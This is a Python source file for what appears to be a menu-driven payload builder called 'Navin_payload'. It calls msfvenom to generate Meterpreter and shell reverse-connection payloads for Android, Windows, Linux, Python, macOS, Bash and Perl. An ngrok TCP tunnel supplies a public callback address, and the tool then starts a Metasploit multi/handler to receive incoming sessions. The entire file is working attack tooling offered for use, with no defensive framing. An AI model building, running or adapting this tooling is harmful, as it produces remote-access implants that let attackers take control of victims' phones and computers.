import os, re
import time
import Payload_master as back
type = ["reverse_tcp", "reverse_http", "reverse_https"]
cyan = "\033[1;36m"
blue = "\033[1;34m"
norml= "\033[0m"
url = ''
lhost = ''
lport = ''

def ngrok(port):
    from pyngrok import ngrok
    global url,lhost,lport
    url = ngrok.connect(port, "tcp")
    url = url.replace('tcp://','')
    url = url.replace(':',' ')
    lhost = url.split(" ")[0]
    lport =  url.split(" ")[1]
    
    
def Android ():
	back.banner ()
	android_pld = int (input ("""\033[1;34mSelect type of Android Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mNavin_payload\033[1;31m/~  \033[1;36m"""))

	if android_pld < 4:
		payloads = "android/meterpreter/"+type[android_pld-1]
		global url,lhost,lport
		port = '25561'
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".apk").replace (" ","")
		ngrok(port)
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

	if android_pld == 4:
		back.exite ()

	if android_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mNavin_payload\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
			Android ()


def Windows ():
	back.banner ()
	windows_pld = int (input ("""\033[1;34mSelect type of Windows Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mNavin_payload\033[1;31m/~  \033[1;36m"""))

	if windows_pld < 4:
		payloads = "windows/meterpreter/"+type[windows_pld-1]
		global url,lhost,lport
		port = '25562'
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".exe").replace (" ","")
		ngrok(port)
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o /sdcard/navin_playload/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

	if windows_pld == 4:
		back.exite()

	if windows_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mNavin_payload\033[1;31m/~"+cyan+"  Plz Retry Enter number from given options."+norml)
			time.sleep(3)
			Windows ()

def Linux ():
	back.banner ()
	linux_pld = int (input ("""\033[1;36mSelect type of Linux Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m  linux/x86/shell/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m  linux/x86/shell/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m  linux/x86/shell/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mNavin_payload\033[1;31m/~  \033[1;36m"""))

	if linux_pld < 4:
		payloads = "linux/x86/shell/"+type[linux_pld-1]
		global url,lhost,lport
		port = '25563'
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".elf").replace (" ","")		
		ngrok(port)
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o /sdcard/navin_playload/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

	if linux_pld == 4:
		back.exite ()

	if linux_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mNavin_payload\033[1;31m/~"+cyan+"  Plz Retry Enter number from given options."+norml)
			time.sleep(3)
			Linux ()


def Python ():
	back.banner ()
	python_pld = int (input ("""\033[1;34mSelect type of Python Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m  python/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m  python/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m  python/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mNavin_payload\033[1;31m/~  \033[1;36m"""))

	if python_pld < 4:
		payloads = "python/meterpreter/"+type[python_pld-1]
		global url,lhost,lport
		port = '25564'
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".py").replace (" ","")
		ngrok(port)
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

	if python_pld == 4:
		back.exite ()

	if python_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mNavin_payload\033[1;31m/~"+cyan+"  Plz Retry Enter number from given options."+norml)
			time.sleep(3)
			Python ()



def Mac ():
	back.banner ()
	global url,lhost,lport
	port = '25565'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".macho").replace (" ","")
	ngrok(port)
	payloads ="osx/x86/shell_reverse_tcp"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/navin_playload/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")




def Bash ():
	back.banner ()
	global url,lhost,lport
	port = '25566'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".sh").replace (" ","")
	ngrok(port)
	payloads = "cmd/unix/reverse_bash_telnet_ssl"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")


def Perl ():
	back.banner ()
	global url,lhost,lport
	port = '25567'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".pl").replace (" ","")
	ngrok(port)
	payloads = "cmd/windows/bind_perl"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
